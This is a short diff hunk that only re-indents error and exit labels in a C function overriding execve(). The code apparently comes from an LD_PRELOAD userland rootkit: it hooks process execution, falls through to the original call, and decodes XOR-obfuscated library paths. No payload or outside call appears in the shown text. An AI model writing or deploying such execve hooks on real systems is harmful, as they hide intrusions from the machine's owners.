@@ -227,22 +227,22 @@ int execve(const char *filename, char *const argv[], char *const envp[])
         else if(check_curr_proc == -1) goto ERROR;
         else if(check_curr_proc == 2) goto CONTINUE;
 
-        CLEAN_EXIT:
-            CLEAN(gpstr);
-            exit(0);
+CLEAN_EXIT:
+    CLEAN(gpstr);
+    exit(0);
 
-        IOERR:
-            errno = EIO;
-            CLEAN(gpstr);
-            return -1;
+IOERR:
+    errno = EIO;
+    CLEAN(gpstr);
+    return -1;
 
-        ERROR:
-            CLEAN(gpstr);
-            return -1;
+ERROR:
+    CLEAN(gpstr);
+    return -1;
 
-        CONTINUE:
-            CLEAN(gpstr);
-            return old_execve(filename, argv, envp);
+CONTINUE:
+    CLEAN(gpstr);
+    return old_execve(filename, argv, envp);
     }
 
     char *ld_linux_so_path = strdup(LD_LINUX_SO_PATH); xor(ld_linux_so_path);
